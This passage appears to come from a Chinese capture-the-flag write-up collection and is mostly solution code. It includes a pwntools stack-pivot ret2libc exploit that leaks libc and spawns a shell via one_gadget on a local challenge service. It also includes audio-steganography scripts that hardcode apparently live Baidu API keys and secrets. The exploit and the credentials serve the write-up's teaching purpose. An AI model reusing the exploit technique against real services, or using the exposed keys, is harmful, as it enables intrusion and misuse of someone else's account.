[65,220,147,60,28,101,152,106,218,245,127,254,37,118,224,192,46,123,16,203,23,138,57,50,256,227,198,180,177,25,141,87,111,234,103,10,148,73,91,15,36,105,79,129,90,79,170,217,87,181],</span><br><span class="line">  [12,76,85,27,62,115,116,221,166,243,97,135,142,223,192,220,33,86,30,135,142,143,78,249,137,56,218,34,186,111,121,31,184,230,12,195,189,31,20,148,59,233,179,20,141,179,147,60,194,175],</span><br><span class="line">  [247,108,209,92,201,117,164,253,211,194,114,62,59,103,123,228,39,100,62,243,164,169,224,35,59,94,6,10,187,116,44,152,55,117,37,227,49,145,133,235,31,18,215,2,168,42,154,68,184,10],</span><br><span class="line">  [93,0,200,198,247,163,123,117,98,44,158,61,114,11,56,3,128,39,105,0,176,29,100,2,119,115,145,135,138,28,4,119,166,183,45,249,196,192,90,161,126,214,161,42,202,150,70,245,62,123],</span><br><span class="line">  [12,59,139,135,117,158,90,0,121,255,105,58,26,247,213,105,205,125,232,54,238,210,9,101,85,96,94,151,118,48,125,119,77,236,66,75,241,108,90,85,137,88,19,166,245,108,33,208,154,88],</span><br><span class="line">  [230,149,85,121,249,128,165,106,85,137,161,25,247,253,95,254,132,123,17,10,230,72,206,174,168,228,250,164,79,12,77,195,219,209,211,208,57,247,165,254,250,203,48,199,6,49,112,31,172,78],</span><br><span class="line">  [21,97,244,163,61,138,24,93,235,187,107,49,231,129,166,168,105,213,188,120,81,136,70,129,78,246,118,160,230,66,83,99,250,176,99,21,109,172,99,235,86,180,145,99,49,31,99,126,198,47],</span><br><span class="line">  [72,75,7,120,42,113,216,241,46,207,34,176,37,117,84,20,86,214,136,125,61,44,216,61,177,66,182,134,108,64,94,91,4,12,244,131,20,254,121,237,26,199,57,217,43,40,57,1,124,234],</span><br><span class="line">  [125,96,128,252,63,0,161,130,104,115,21,70,223,4,212,68,45,233,143,124,40,238,249,3,206,176,102,188,208,120,186,252,16,155,94,235,67,25,226,119,136,244,25,156,240,244,193,17,218,169],</span><br><span class="line">  [148,20,159,113,52,168,229,213,172,200,70,244,69,168,195,96,168,152,200,47,123,139,120,116,192,14,134,145,163,199,196,120,174,70,21,234,22,88,102,127,55,22,245,19,16,187,114,119,252,112],</span><br><span class="line">  [54,237,256,58,55,182,70,66,214,177,126,106,80,65,218,235,191,94,213,252,57,165,13,190,224,52,11,36,208,141,119,194,231,253,16,169,239,37,25,251,1,241,247,133,12,34,244,86,67,43],</span><br><span class="line">  [29,40,108,109,205,7,88,206,29,221,123,141,251,76,64,68,204,228,57,195,15,188,6,113,46,174,116,40,71,125,180,240,10,23,18,226,240,208,180,57,53,205,205,101,64,97,63,251,77,106],</span><br><span class="line">  [176,146,160,144,239,64,63,255,105,121,75,204,194,66,168,166,253,54,84,33,185,175,146,86,54,87,127,141,14,170,248,81,26,21,25,194,9,24,241,213,185,43,144,133,112,142,7,55,17,49],</span><br><span class="line">  [156,27,118,8,111,22,164,28,80,16,69,23,14,14,181,141,48,15,161,46,92,79,198,212,121,42,41,0,206,186,81,42,166,158,33,104,153,7,181,88,164,105,29,247,10,211,98,103,224,186],</span><br><span class="line">  [38,122,27,198,206,166,139,212,204,199,125,209,190,166,162,1,109,126,251,106,181,176,31,93,89,70,103,193,153,102,154,253,116,72,61,214,46,63,154,142,127,34,80,166,230,12,75,139,204,25],</span><br><span class="line">  [79,27,105,30,175,107,158,21,179,84,48,202,38,87,148,250,145,49,147,112,82,93,234,8,144,161,201,55,9,250,249,19,245,51,211,143,226,214,30,66,199,18,98,243,142,96,119,254,13,145],</span><br><span class="line">  [73,17,241,93,126,64,243,182,131,74,8,8,130,241,256,58,121,207,106,112,172,63,244,166,135,81,104,157,117,116,19,138,123,33,164,202,238,216,23,230,29,117,186,237,193,213,70,200,137,204],</span><br><span class="line">  [175,43,178,24,125,9,90,208,133,2,31,135,207,158,76,114,255,159,14,207,218,208,255,16,244,121,135,11,94,132,175,222,6,101,171,27,134,2,181,175,222,63,243,204,98,30,44,35,69,175],</span><br><span class="line">  [244,190,74,183,118,189,148,86,238,194,232,33,219,21,103,191,175,150,228,1,205,34,51,189,222,127,61,144,78,160,155,117,74,222,192,189,116,101,243,50,6,212,60,76,90,87,93,135,215,235],</span><br><span class="line">  [56,110,105,28,52,42,145,7,196,110,229,237,219,243,141,73,30,73,123,108,149,144,236,202,108,10,72,160,16,111,173,22,235,86,86,174,185,44,78,144,200,118,33,158,190,3,255,10,148,83],</span><br><span class="line">  [249,147,83,224,170,122,14,241,126,36,248,46,246,25,228,143,26,146,210,47,0,28,122,206,213,179,69,163,189,187,149,128,171,168,200,110,187,256,238,125,250,118,15,106,14,38,119,179,1,209],</span><br><span class="line">  [68,79,154,139,71,117,130,98,136,160,146,74,137,107,115,108,233,242,199,206,19,223,147,44,100,33,77,70,66,173,131,85,68,63,92,87,79,239,96,176,164,203,50,53,256,89,77,88,126,7],</span><br><span class="line">  [130,11,151,11,201,119,165,163,189,120,22,170,46,138,136,118,153,250,70,164,208,230,150,156,53,28,243,46,166,54,143,192,225,225,253,5,212,138,235,179,95,255,195,68,248,105,192,237,121,14],</span><br><span class="line">  [236,204,77,120,79,191,176,77,38,221,97,170,41,9,96,195,70,18,96,28,13,51,87,225,2,28,218,230,53,253,171,83,83,224,41,31,247,126,228,254,115,0,87,33,29,85,200,113,158,187],</span><br><span class="line">  [22,186,66,8,171,180,195,151,204,157,211,141,217,67,80,20,58,21,233,115,62,111,166,210,65,95,252,139,80,223,31,6,226,204,92,197,122,133,51,64,191,250,203,118,144,135,247,97,35,10],</span><br><span class="line">  [45,144,167,46,138,170,169,113,202,58,93,86,29,118,43,121,228,93,120,71,113,99,185,102,64,5,247,123,224,214,148,132,166,49,238,199,211,197,243,48,55,103,74,73,218,62,200,47,73,135],</span><br><span class="line">  [27,128,70,245,100,225,76,201,20,130,112,132,45,92,143,12,12,159,238,142,184,181,152,227,113,67,53,232,203,192,177,94,88,211,11,231,41,232,0,48,161,9,107,80,138,190,230,166,250,102],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    sol, max_val, dp = get_solution(arr)</span><br><span class="line">    print(sol)</span><br><span class="line">RRDDRRDRRDRRRDRDDDDRRRDRDDRRRDRRDRRRDRDRDRDRRRDDRDRRRRDDDDDDDRDDRDDDDDDDDRDDDDDRDDRDRRDRRRRRRDDRRR</span><br><span class="line">RRDDRRDRRDRRRDRDDDDRRRDRDDRRRDRRDRRRDRDRDRDRRRDDRDRRRRDDDDDDDRDDRDDDDDDDDRDDDDDRDDRDRRDRRRRRRDDRRR</span><br><span class="line">Good job</span><br><span class="line">flag&#123;333b61656d554e1e200208247b73&#125;</span><br><span class="line">import idc</span><br><span class="line"></span><br><span class="line">st = MinEA()</span><br><span class="line">ed = MaxEA()</span><br><span class="line">ea = st</span><br><span class="line">while ea &lt; ed:</span><br><span class="line">    if Byte(ea) == 0x75 and Byte(ea+1) == 0x03 and Byte(ea+2) == 0x74 and Byte(ea+3) == 0x01 and Byte(ea+4) == 0xe8:</span><br><span class="line">        print(&quot;发现花指令&quot;)    </span><br><span class="line">        patch_byte(ea, 0x90)</span><br><span class="line">        patch_byte(ea+1, 0x90)</span><br><span class="line">        patch_byte(ea+2, 0x90)</span><br><span class="line">        patch_byte(ea+3, 0x90)</span><br><span class="line">        patch_byte(ea+4, 0x90)</span><br><span class="line">    ea += 1</span><br><span class="line">    #include &lt;string.h&gt;</span><br><span class="line">    #include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">    #define BYTE unsigned char</span><br><span class="line">    #define WORD unsigned short</span><br><span class="line">    #define DWORD unsigned int</span><br><span class="line"></span><br><span class="line">    #define TRUE 1</span><br><span class="line">    #define FALSE 0</span><br><span class="line"></span><br><span class="line">BYTE bThreshold;  //压缩阈值、长度大于等于2的匹配串才有必要压缩</span><br><span class="line"></span><br><span class="line">BYTE bPreBufSizeBits;  //前向缓冲区占用的比特位</span><br><span class="line">BYTE bWindowBufSizeBits;  //滑动窗口占用的比特位</span><br><span class="line"></span><br><span class="line">WORD wPreBufSize;  //通过占用的比特位计算缓冲区大小</span><br><span class="line">WORD wWindowBufSize;  //通过占用的比特位计算滑动窗口大小</span><br><span class="line"></span><br><span class="line">BYTE bPreBuf[1024];  //前向缓冲区</span><br><span class="line">BYTE bWindowBuf[8192];  //滑动窗口</span><br><span class="line">BYTE bMatchString[1024];  //匹配串</span><br><span class="line">WORD wMatchIndex;  //滑动窗口匹配串起始下标</span><br><span class="line"></span><br><span class="line">BYTE FindSameString(BYTE *pbStrA, WORD wLenA, BYTE *pbStrB, WORD wLenB, WORD *pwMatchIndex);</span><br><span class="line">DWORD LZSS_decode(char *pbReadFileName, char *pbWriteFileName);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    bThreshold = 3;</span><br><span class="line">    bPreBufSizeBits = 8;</span><br><span class="line">    bWindowBufSizeBits = 16 - bPreBufSizeBits;</span><br><span class="line">    wPreBufSize = ((WORD)1 &lt;&lt; bPreBufSizeBits) - 1 + bThreshold;</span><br><span class="line">    wWindowBufSize = ((WORD)1 &lt;&lt; bWindowBufSizeBits) - 1 + bThreshold;</span><br><span class="line"></span><br><span class="line">    LZSS_decode(&quot;out&quot;, &quot;decode.txt&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BYTE FindSameString(BYTE *pbStrA, WORD wLenA, BYTE *pbStrB, WORD wLenB, WORD *pwMatchIndex)</span><br><span class="line">&#123;</span><br><span class="line">    WORD i, j;</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; wLenA; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ((wLenA - i) &lt; wLenB)</span><br><span class="line">        &#123;</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (pbStrA[i] == pbStrB[0])</span><br><span class="line">        &#123;</span><br><span class="line">            for (j = 1; j &lt; wLenB; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                if (pbStrA[i + j] != pbStrB[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (j == wLenB)</span><br><span class="line">            &#123;</span><br><span class="line">                *pwMatchIndex = i;</span><br><span class="line">                return TRUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD LZSS_decode(char *pbReadFileName, char *pbWriteFileName)</span><br><span class="line">&#123;</span><br><span class="line">    WORD i, j;</span><br><span class="line">    BYTE bItemNum;</span><br><span class="line">    BYTE bFlag;</span><br><span class="line">    WORD wStart;</span><br><span class="line">    WORD wMatchStringCnt = 0;</span><br><span class="line">    WORD wWindowBufCnt = 0;</span><br><span class="line">    FILE *pfRead = fopen(pbReadFileName, &quot;rb&quot;);</span><br><span class="line">    FILE *pfWrite = fopen(pbWriteFileName, &quot;wb&quot;);</span><br><span class="line"></span><br><span class="line">    while (0 != fread(&amp;bFlag, 1, 1, pfRead))</span><br><span class="line">    &#123;</span><br><span class="line">        for (bItemNum = 0; bItemNum &lt; 8; bItemNum++)</span><br><span class="line">        &#123;</span><br><span class="line">            if (0 == (bFlag &amp; ((BYTE)1 &lt;&lt; (7 - bItemNum))))</span><br><span class="line">            &#123;</span><br><span class="line">                if (fread(bPreBuf, 1, 1, pfRead) &lt; 1)</span><br><span class="line">                &#123;</span><br><span class="line">                    goto LZSS_decode_out_;</span><br><span class="line">                &#125;</span><br><span class="line">                fwrite(bPreBuf, 1, 1, pfWrite);</span><br><span class="line">                bMatchString[0] = bPreBuf[0];</span><br><span class="line">                wMatchStringCnt = 1;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                if (fread(bPreBuf, 1, 2, pfRead) &lt; 2)</span><br><span class="line">                &#123;</span><br><span class="line">                    goto LZSS_decode_out_;</span><br><span class="line">                &#125;</span><br><span class="line">                wStart = ((WORD)bPreBuf[0] | ((WORD)bPreBuf[1] &lt;&lt; 8)) / ((WORD)1 &lt;&lt; bPreBufSizeBits);  </span><br><span class="line">                wMatchStringCnt = ((WORD)bPreBuf[0] | ((WORD)bPreBuf[1] &lt;&lt; 8)) % ((WORD)1 &lt;&lt; bPreBufSizeBits) + bThreshold;</span><br><span class="line">                fwrite(&amp;bWindowBuf[wStart], 1, wMatchStringCnt, pfWrite);</span><br><span class="line">                memcpy(bMatchString, &amp;bWindowBuf[wStart], wMatchStringCnt);</span><br><span class="line">            &#125;</span><br><span class="line">            if ((wWindowBufCnt + wMatchStringCnt) &gt; wWindowBufSize)</span><br><span class="line">            &#123;</span><br><span class="line">                j = (wWindowBufCnt + wMatchStringCnt) - wWindowBufSize;</span><br><span class="line">                for (i = 0; i &lt; wWindowBufCnt - j; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    bWindowBuf[i] = bWindowBuf[i + j];</span><br><span class="line">                &#125;</span><br><span class="line">                wWindowBufCnt -= j;</span><br><span class="line">            &#125;</span><br><span class="line">            memcpy(&amp;bWindowBuf[wWindowBufCnt], bMatchString, wMatchStringCnt);</span><br><span class="line">            wWindowBufCnt += wMatchStringCnt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">LZSS_decode_out_:</span><br><span class="line"></span><br><span class="line">    fclose(pfRead);</span><br><span class="line">    fclose(pfWrite);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">from pwn import*</span><br><span class="line">context.log_level=True</span><br><span class="line">    #p=process(&#x27;./stack&#x27;)</span><br><span class="line">p=remote(&quot;127.0.0.1&quot;,8665)</span><br><span class="line">elf=ELF(&#x27;stack&#x27;)</span><br><span class="line">libc=ELF(&#x27;libc.so.6&#x27;)</span><br><span class="line">buf=0x6010A0+0X100</span><br><span class="line">print hex(buf)</span><br><span class="line">    #puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_plt=0x400520</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">    #read_plt=elf.plt[&#x27;read&#x27;]</span><br><span class="line">read_plt=0x400530</span><br><span class="line">main=0x40071A</span><br><span class="line"></span><br><span class="line">leve_ret=0x00400718</span><br><span class="line">popret=0x00000000004007a3</span><br><span class="line"></span><br><span class="line">payload=&#x27;A&#x27;*0x100+p64(buf)+p64(popret)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;your name:n&#x27;)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;your data:n&#x27;)</span><br><span class="line">payload1=&#x27;a&#x27;*0x70+p64(buf)+p64(leve_ret)</span><br><span class="line"></span><br><span class="line">    #gdb.attach(p,&#x27;b *0x40060F&#x27;)</span><br><span class="line">    #raw_input()</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">    #p.recv()</span><br><span class="line"></span><br><span class="line">putsadd=u64(p.recvuntil(&#x27;n&#x27;,drop=True).ljust(0x8,&#x27;x00&#x27;))</span><br><span class="line">print hex(putsadd)</span><br><span class="line"></span><br><span class="line">libc_base = putsadd- libc.sym[&#x27;puts&#x27;]</span><br><span class="line">one_gadget = libc_base +0xf03a4</span><br><span class="line">p.recv()</span><br><span class="line">p.send(&quot;1&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">pay= 0x78*&#x27;a&#x27; + p64(one_gadget)*4</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br><span class="line">size_r=src.size;</span><br><span class="line">ptr_r=src.ptr;</span><br><span class="line">check(src,dst);</span><br><span class="line">free(dst.ptr);</span><br><span class="line">src.size=0;src.ptr=0;</span><br><span class="line">dst.size=size_r;dst.ptr=src_r;</span><br><span class="line">//src=dst时，会导致dst的ptr指向已释放的区域，且dst.size=0</span><br><span class="line">struct Table &#123;</span><br><span class="line">    struct GCObject *next;</span><br><span class="line">    lu_byte tt;</span><br><span class="line">    lu_byte marked;</span><br><span class="line">    lu_byte flags;</span><br><span class="line">    lu_byte lsizenode;</span><br><span class="line">    unsigned int alimit;</span><br><span class="line">    TValue *array;</span><br><span class="line">    Node *node; /*     24      |       8 */</span><br><span class="line">    Node *lastfree;</span><br><span class="line">    struct Table *metatable;</span><br><span class="line">    GCObject *gclist;</span><br><span class="line">&#125;</span><br><span class="line">from PIL import Image</span><br><span class="line">import os</span><br><span class="line">from aip import AipSpeech</span><br><span class="line">from subprocess import *</span><br><span class="line">from tqdm import tqdm  </span><br><span class="line">import pickle </span><br><span class="line">import io </span><br><span class="line"></span><br><span class="line">def load_mp3(folder):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    加载文件夹下的mp3</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    mp3list = []</span><br><span class="line">    # img=[]</span><br><span class="line">    for mp3 in os.listdir(folder):</span><br><span class="line">        ext = os.path.splitext(mp3)</span><br><span class="line">        # if len(ext) &gt; 1 and is_img(ext[1]):</span><br><span class="line">        if ext[1] == &#x27;.mp3&#x27; :</span><br><span class="line">            filename=folder+mp3</span><br><span class="line">            mp3list.append(filename)</span><br><span class="line">            # img.append(mp3)</span><br><span class="line"></span><br><span class="line">    return mp3list</span><br><span class="line"></span><br><span class="line">def getimage(mp3file):</span><br><span class="line">    with open(mp3file,&#x27;rb&#x27;) as f:</span><br><span class="line">        fr=f.read()</span><br><span class="line">    offset=int.from_bytes(fr[14:18],&#x27;big&#x27;)</span><br><span class="line">    fr1=fr[20:20+offset]</span><br><span class="line">    fr1=fr1[13:]</span><br><span class="line">    img=io.BytesIO(fr1)</span><br><span class="line">    img=Image.open(img)</span><br><span class="line">    return img</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    num_dict=&#123;&quot;0&quot;:u&quot;零&quot;,&quot;1&quot;:u&quot;一&quot;,&quot;2&quot;:u&quot;二&quot;,&quot;3&quot;:u&quot;三&quot;,&quot;4&quot;:u&quot;四&quot;,&quot;5&quot;:u&quot;五&quot;,&quot;6&quot;:u&quot;六&quot;,&quot;7&quot;:u&quot;七&quot;,&quot;8&quot;:u&quot;八&quot;,&quot;9&quot;:u&quot;九&quot;&#125;</span><br><span class="line">    new_dict=&#123;v:k for k,v in num_dict.items()&#125;</span><br><span class="line">    print(num_dict)</span><br><span class="line">    print(new_dict)  #互换键值</span><br><span class="line">    set1=set(&#x27;0123456789&#x27;+&#x27;&#x27;.join([i for i in new_dict]))</span><br><span class="line">    set2=set(&#x27;0123456789&#x27;)</span><br><span class="line"></span><br><span class="line">    mp3list=load_mp3(&#x27;./random/&#x27;)</span><br><span class="line"></span><br><span class="line">    dict1=&#123;&#125;</span><br><span class="line">    for i,mp3 in tqdm(enumerate(mp3list)):    #把mp3转换成wav，百度aip对wav支持较好</span><br><span class="line">        wavname=&#x27;./wav/&#x27;+os.path.split(mp3)[1].split(&#x27;.&#x27;)[0]+&#x27;.wav&#x27;</span><br><span class="line">        indexname=os.path.split(mp3)[1].split(&#x27;.&#x27;)[0]</span><br><span class="line">        cmd=&quot;ffmpeg.exe -i &#123;&#125; -f wav -ac 1 -ar 16000 &#123;&#125;&quot;.format(mp3,wavname)   #调用ffmpeg.exe</span><br><span class="line"></span><br><span class="line">        p=Popen(cmd,shell=True,stdout=open(&quot;process.out&quot;, &quot;w&quot;), close_fds=True)</span><br><span class="line">        p.wait()</span><br><span class="line"></span><br><span class="line">        with open(wavname, &#x27;rb&#x27;) as f:</span><br><span class="line">            fp= f.read()</span><br><span class="line">            # 识别本地文件</span><br><span class="line">        try:</span><br><span class="line">            result = client.asr(fp, &#x27;wav&#x27;, 16000, &#123;&#x27;dev_pid&#x27;: 1537&#125;)</span><br><span class="line"># 默认1537（普通话 输入法模型），dev_pid参数见本节开头的表格</span><br><span class="line">            tmp=result[&#x27;result&#x27;][0][:-1]</span><br><span class="line">            if set(tmp).issubset(set2):</span><br><span class="line">                dict1[indexname]=int(tmp)</span><br><span class="line">            elif    set(tmp).issubset(set1):</span><br><span class="line">                tmp1=&#x27;&#x27;</span><br><span class="line">                for j in tmp:</span><br><span class="line">                    if j in set2:</span><br><span class="line">                        tmp1+=j</span><br><span class="line">                    else:</span><br><span class="line">                        tmp1+=new_dict[j]</span><br><span class="line">                dict1[indexname]=int(tmp1)</span><br><span class="line">            else:</span><br><span class="line">                dict1[indexname]=tmp</span><br><span class="line">        </span><br><span class="line">except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            print(&quot;./wav/&#123;&#125;.wav&quot;.format(i))</span><br><span class="line">    pass</span><br><span class="line">    dict2=&#123;v:k for k,v in dict1.items()&#125;   #互换键值</span><br><span class="line">    print(dict2)</span><br><span class="line">    for i in range(0,625):</span><br><span class="line">        try:</span><br><span class="line">            dict2[i]</span><br><span class="line">        </span><br><span class="line">except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            print(i,&#x27;不存在&#x27;)</span><br><span class="line">    pick_file = open(&#x27;dict2.pickle&#x27;,&#x27;wb&#x27;)</span><br><span class="line">    pickle.dump(dict2,pick_file)</span><br><span class="line">    pick_file.close()</span><br><span class="line"></span><br><span class="line">    pick_file = open(&#x27;dict1.pickle&#x27;,&#x27;wb&#x27;)</span><br><span class="line">    pickle.dump(dict1,pick_file)</span><br><span class="line">    pick_file.close()</span><br><span class="line"></span><br><span class="line">APP_ID = &#x27;26805318&#x27; </span><br><span class="line">API_KEY = &#x27;zXkQ4cEEVHPHLSoEjqLgevqQ&#x27; </span><br><span class="line">SECRET_KEY = &#x27;7GptONVCNLblYqwevUq6YzgFLPOO1i4B&#x27; </span><br><span class="line"></span><br><span class="line">client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)</span><br><span class="line"></span><br><span class="line">wavpath=&#x27;./wav/&#x27;     #调试数据所在目录</span><br><span class="line">if not os.path.exists(wavpath):</span><br><span class="line">    os.mkdir(wavpath)</span><br><span class="line"></span><br><span class="line">if  not os.path.exists(&#x27;dict2.pickle&#x27;):</span><br><span class="line">    main()      #如果没有转换成wav,需要先转换一次,然后得到pickle</span><br><span class="line">else:            #直接读取pickle</span><br><span class="line">    pickfile = open(&#x27;dict2.pickle&#x27;,&#x27;rb&#x27;)</span><br><span class="line">    dictfile2 = pickle.load(pickfile)</span><br><span class="line">    print(dictfile2)</span><br><span class="line">    pickfile = open(&#x27;dict1.pickle&#x27;,&#x27;rb&#x27;)</span><br><span class="line">    dictfile1 = pickle.load(pickfile)</span><br><span class="line">    print(dictfile1)</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">img1=Image.new(&#x27;RGB&#x27;,(2500,2500),&#x27;white&#x27;)  #新建底图</span><br><span class="line">for i in range(0,625):</span><br><span class="line">    try:</span><br><span class="line">        mp3num=dictfile2[i]</span><br><span class="line">        mp3file=&#x27;./random/&#x27;+mp3num+&#x27;.mp3&#x27;</span><br><span class="line">        img=getimage(mp3file)    #提取mp3中的图片</span><br><span class="line">        x=(i%25)*100</span><br><span class="line">        y=(i//25)*100</span><br><span class="line">        img1.paste(img,(x,y))</span><br><span class="line">    </span><br><span class="line">except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        print(i,&#x27;没有找到&#x27;)</span><br><span class="line">img1.save(&#x27;tmp.png&#x27;)</span><br><span class="line">img1.show()</span><br><span class="line">pass</span><br><span class="line">import pickle</span><br><span class="line">import os </span><br><span class="line"></span><br><span class="line">def load_mp3(folder):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    加载文件夹下的mp3</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    mp3list = []</span><br><span class="line">    # img=[]</span><br><span class="line">    for mp3 in os.listdir(folder):</span><br><span class="line">        ext = os.path.splitext(mp3)</span><br><span class="line">        # if len(ext) &gt; 1 and is_img(ext[1]):</span><br><span class="line">        if ext[1] == &#x27;.mp3&#x27; :</span><br><span class="line">            filename=folder+mp3</span><br><span class="line">            mp3list.append(filename)</span><br><span class="line">            # img.append(mp3)</span><br><span class="line"></span><br><span class="line">    return mp3list</span><br><span class="line"></span><br><span class="line">def getFrameoffset(fr):</span><br><span class="line">    tmp=&#x27;&#x27;</span><br><span class="line">    for i in fr:</span><br><span class="line">        tmp+=bin(i)[2:].zfill(7)</span><br><span class="line">    pass</span><br><span class="line">    return int(tmp,2)</span><br><span class="line"></span><br><span class="line">def getpadding(mp3):</span><br><span class="line">    with open(mp3,&#x27;rb&#x27;)as f:</span><br><span class="line">        fr=f.read()</span><br><span class="line">    offset=getFrameoffset(fr[6:10])+10</span><br><span class="line">    padding=fr[offset-4096:</span><br><span class="line">offset]</span><br><span class="line">    if set(padding)==&#123;0&#125;:    #全为0说明padding里头没有数据</span><br><span class="line">        print(&#x27;no mp3 inside&#x27;)</span><br><span class="line">        return None,fr</span><br><span class="line">    else:                    #说明padding里头有东西,我们从非0开始取数据,发现是mp3</span><br><span class="line">        for i,data in enumerate(padding):</span><br><span class="line">            if data!=0:</span><br><span class="line">                newmp3=padding[i:]</span><br><span class="line">                return newmp3,fr</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">pickfile = open(&#x27;dict2.pickle&#x27;,&#x27;rb&#x27;)</span><br><span class="line">dictfile2 = pickle.load(pickfile)</span><br><span class="line">print(type(dictfile2),dictfile2)</span><br><span class="line">print(100*&#x27;*&#x27;)</span><br><span class="line">pickfile = open(&#x27;dict1.pickle&#x27;,&#x27;rb&#x27;)</span><br><span class="line">dictfile1 = pickle.load(pickfile)</span><br><span class="line">print(type(dictfile1),dictfile1)</span><br><span class="line"></span><br><span class="line">if not os.path.exists(&#x27;./存在padding的文件/&#x27;):</span><br><span class="line">    os.mkdir(&#x27;./存在padding的文件/&#x27;)</span><br><span class="line"></span><br><span class="line">mp3list=load_mp3(&#x27;./random/&#x27;)</span><br><span class="line">for i,mp3 in enumerate(mp3list):</span><br><span class="line">    n=os.path.split(mp3)[1].split(&#x27;.&#x27;)[0]</span><br><span class="line">    newmp3,mp3file=getpadding(mp3)</span><br><span class="line">    if newmp3:   #padding中存在mp3</span><br><span class="line">        open(&#x27;./存在padding的文件/&#123;&#125;-&#123;&#125;-padding.mp3&#x27;.format(dictfile1[n],n),&#x27;wb&#x27;).write(newmp3)</span><br><span class="line">        open(&#x27;./存在padding的文件/&#123;&#125;-&#123;&#125;.mp3&#x27;.format(dictfile1[n],n),&#x27;wb&#x27;).write(mp3file)</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br><span class="line">    pass</span><br><span class="line">import os</span><br><span class="line">from aip import AipSpeech</span><br><span class="line">from subprocess import *</span><br><span class="line"></span><br><span class="line">def load_mp3(folder):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    加载文件夹下的mp3</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    mp3list = []</span><br><span class="line">    dict1=&#123;&#125;</span><br><span class="line">    for mp3 in os.listdir(folder):</span><br><span class="line">        ext = os.path.splitext(mp3)</span><br><span class="line"></span><br><span class="line">        if ext[1] == &#x27;.mp3&#x27; and &#x27;padding&#x27; in mp3:</span><br><span class="line">            id=int(ext[0].split(&#x27;-&#x27;)[0])</span><br><span class="line">            filename=folder+mp3</span><br><span class="line">            mp3list.append(filename)</span><br><span class="line">            dict1[id]=filename</span><br><span class="line"></span><br><span class="line">    return mp3list,dict1</span><br><span class="line"></span><br><span class="line">APP_ID = &#x27;26805318&#x27; </span><br><span class="line">API_KEY = &#x27;zXkQ4cEEVHPHLSoEjqLgevqQ&#x27; </span><br><span class="line">SECRET_KEY = &#x27;7GptONVCNLblYqwevUq6YzgFLPOO1i4B&#x27; </span><br><span class="line"></span><br><span class="line">client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)</span><br><span class="line"></span><br><span class="line">mp3dict=load_mp3(&#x27;./存在padding的文件/&#x27;)[1]</span><br><span class="line"></span><br><span class="line">wavpath=&#x27;./flagwav/&#x27;     #调试数据所在目录</span><br><span class="line">if not os.path.exists(wavpath):</span><br><span class="line">    os.mkdir(wavpath)</span><br><span class="line"></span><br><span class="line">res=[]</span><br><span class="line">for i in range(48):</span><br><span class="line">    wavname=&#x27;./flagwav/&#x27;+str(i)+&#x27;.wav&#x27;</span><br><span class="line"></span><br><span class="line">    cmd=&quot;ffmpeg.exe -i &#123;&#125; -f wav -ac 1 -ar 16000 &#123;&#125;&quot;.format(mp3dict[i],wavname)   #调用ffmpeg.exe</span><br><span class="line"></span><br><span class="line">    p=Popen(cmd,shell=True,stdout=open(&quot;process.out&quot;, &quot;w&quot;), close_fds=True)</span><br><span class="line">    p.wait()</span><br><span class="line"></span><br><span class="line">    with open(wavname, &#x27;rb&#x27;) as f:</span><br><span class="line">        fp= f.read()</span><br><span class="line">        # 识别本地文件</span><br><span class="line">    try:</span><br><span class="line">        result = client.asr(fp, &#x27;wav&#x27;, 16000, &#123;&#x27;dev_pid&#x27;: 1737&#125;)</span><br><span class="line"># 默认1537（普通话 输入法模型），1737是英语</span><br><span class="line">        tmp=result[&#x27;result&#x27;][0][:-1]</span><br><span class="line">        res.append((i,tmp))</span><br><span class="line">        # print(tmp,end=&#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">open(&quot;结果识别.txt&quot;,&#x27;w&#x27;).write(&#x27;&#x27;.join([str(i)+&#x27;n&#x27; for i in 